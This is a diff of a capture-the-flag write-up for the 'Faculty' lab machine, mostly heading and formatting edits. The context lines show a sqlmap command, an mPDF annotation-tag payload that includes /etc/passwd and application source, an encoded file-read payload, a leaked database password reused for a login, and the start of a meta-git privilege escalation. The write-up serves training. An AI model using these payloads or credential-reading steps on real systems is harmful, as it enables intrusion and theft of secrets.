@@ -149,7 +149,7 @@ sqlmap -r save_course.req --batch --threads 10 --dbms mysql --risk 3 --level 5
 looks like it isn't, at leaast for this `save_course` one, lets move on anyways. 
 
 
-## mPDF
+## Exploring potential exploits for mPDF
 
 As admin some of the pages also have a button to generate pdfs on the fly, when you hit the button it sends a b64 encoded payload of whatever data is on the page. 
 
@@ -266,7 +266,8 @@ Looking into the deserialization, looks like the phar/jpeg needs to be hosted lo
 
 That annotation tag thing was super hard to find, but it works, let look at it closer
 
-## mPDF includes files in html annotation tags
+## Circling back to the mPDF LFI
+
 So according to this github issue: [https://github.com/mpdf/mpdf/issues/356](https://github.com/mpdf/mpdf/issues/356)  
 
 We could abuse the html tags to have mPDF include system files in the pdf, like this: 
@@ -283,6 +284,7 @@ So we get something like that
 ```html
 <h1><a name="top"></a>faculty.htb</h1><h2>Subjects</h2><table>    <thead>        <tr>            <th class="text-center">#</th>            <th class="text-left">Subject</th>            <th class="text-left">Description</th>            </tr></thead><tbody><tr><td class="text-center">1</td><td class="text-center"><b>DBMS</b></td><td class="text-center"><small><b>Database Management System</b></small></td></tr><tr><td class="text-center">2</td><td class="text-center"><b>Mathematics</b></td><td class="text-center"><small><b>Mathematics</b></small></td></tr><tr><td class="text-center">3</td><td class="text-center"><b>English</b></td><td class="text-center"><small><b>English</b></small></td></tr><tr><td class="text-center">4</td><td class="text-center"><b>Computer Hardware</b></td><td class="text-center"><small><b>Computer Hardware</b></small></td></tr><tr><td class="text-center">5</td><td class="text-center"><b>History</b></td><td class="text-center"><small><b>History</b></small></td></tr></tboby></table>
 ```
+
 formated in a more readable fashion
 ```html
 <h1><a name="top"></a>faculty.htb</h1>
@@ -323,8 +325,8 @@ formated in a more readable fashion
 	</tboby>
 </table>
 ```
-But do we care? Probably not, lets try to swap that with what we want: 
 
+But do we care? Probably not, lets try to swap that with what we want: 
 ```html
 <annotation file="/etc/passwd" content="/etc/passwd"  icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
 ```
@@ -450,7 +452,8 @@ Double url encoded payload:
 Base64 encoded payload:
 JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4vYWRtaW5fY2xhc3MucGhwJTI1MjIlMjUyMGNvbnRlbnQlMjUzRCUyNTIyL3Zhci93d3cvc2NoZWR1bGluZy9hZG1pbi9hZG1pbl9jbGFzcy5waHAlMjUyMiUyNTIwaWNvbiUyNTNEJTI1MjJHcmFwaCUyNTIyJTI1MjB0aXRsZSUyNTNEJTI1MjJBdHRhY2hlZCUyNTIwRmlsZSUyNTNBJTI1MjAvdmFyL3d3dy9zY2hlZHVsaW5nL2FkbWluL2FkbWluX2NsYXNzLnBocCUyNTIyJTI1MjBwb3MteCUyNTNEJTI1MjIxOTUlMjUyMiUyNTIwLyUyNTNF
 ```
-```bash
+
+```php
 <?php
 session_start();
 ini_set('display_errors', 1);
@@ -924,6 +927,8 @@ JTI1M0Nhbm5vdGF0aW9uJTI1MjBmaWxlJTI1M0QlMjUyMi92YXIvd3d3L3NjaGVkdWxpbmcvYWRtaW4v
 $conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
 ```
 
+## Connecting with a reused password
+
 Because we leaked /etc/passwd we know the sched is not a unix user but maybe the password was reused with one of the other users, wich luckily it was with gbyolo.  
 ```bash
 gbyolo@faculty:~$ pwd
@@ -942,7 +947,7 @@ User gbyolo may run the following commands on faculty:
     (developer) /usr/local/bin/meta-git
 ```
 
-## Privesc with Meta-git RCE 
+## Lateral Privesc with Meta-git RCE 
 
 gbyolo has sudo priviledges to developper using something called meta-git  
 There's a poc for RCE on that:  
